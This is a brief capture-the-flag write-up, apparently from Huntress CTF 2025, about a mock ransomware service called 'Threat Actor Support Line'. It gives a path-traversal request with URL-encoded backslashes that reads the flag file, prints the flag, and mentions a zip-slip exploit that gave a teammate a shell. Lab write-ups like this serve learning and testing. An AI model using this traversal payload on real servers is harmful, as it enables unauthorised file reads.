## Challenge Prompt

You've heard of *RaaS*, you've heard of *SaaS*... the **_Threat Actor Support Line_** brings the two together!

Upload the files you want encrypted, and the service will start up its own hacker computer *(as the Administrator user with antivirus disabled, of course)* and encrypt them for you!

![Challenge](https://raw.githubusercontent.com/j0hn-G4lt/huntressCTF-2025/main/Images/Pasted%20image%2020251103145247.png)

- Checking for LFI vulnerabilities in the `/download` endpoint we find the flag via URL encoded slashes.

`/download/..%5C..%5C..%5Cflag.txt`

```sh
cat flag.txt

flag{6529440ceec226f31a3b2dc0d0b06965}
```

- There is also [CVE-2025-8088](https://github.com/techcorp/CVE-2025-8088-Exploit?tab=readme-ov-file) which I didn't use since it required windows I believe, but a team member successfully executed the zipslip vulnerability for a shell and found the flag that way too.
